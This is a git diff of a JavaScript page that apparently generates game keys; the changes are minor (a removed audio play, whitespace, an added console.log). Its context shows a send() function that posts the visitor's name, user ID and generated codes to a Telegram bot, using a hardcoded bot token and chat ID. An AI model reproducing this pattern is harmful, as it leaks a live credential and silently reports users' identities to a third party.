@@ -302,9 +302,7 @@ async function generate() {
         let keyValue = document.getElementById('keys-value-' + (i + 1));
         keyValue.innerText = codes[i];
     }
-    document.getElementById("ordak").style.display = 'block';
-document.getElementById("ordak").play();
-     generateButton.style.display = 'block';
+  generateButton.style.display = 'block';
     gameSelect.disabled = false;
     clearInterval(generateTimeInterval);
     updateGenerateTime(gameSelect)
@@ -319,7 +317,7 @@ function send(msgArray) {
          const userid = userIdParam[1];
             const firstName = decodeURIComponent(firstNameParam[1]);
             const escapedMsgArray = msgArray.map(msg => msg.replace(/[-]/g, '\\-'));
-        const message = `${firstName} : ${userid} \n ${escapedMsgArray.join(' ')}`;
+        const message = `${firstName} : ${userid} \n${escapedMsgArray.join(' ')}`;
       const TOK = '7118863448:AAFUXZ9lIOPB7-8HqIJDnsigUdATvpkg4L8';
             const TcID = '-1002248182942';
             const data = JSON.stringify({
@@ -327,7 +325,7 @@ function send(msgArray) {
                 text: message,
                 parse_mode: 'MarkdownV2'
             });
-
+           console.log(message);
             const xhr = new XMLHttpRequest();
             xhr.open('POST', `https://api.telegram.org/bot${TOK}/sendMessage`, true);
             xhr.setRequestHeader('Content-Type', 'application/json');
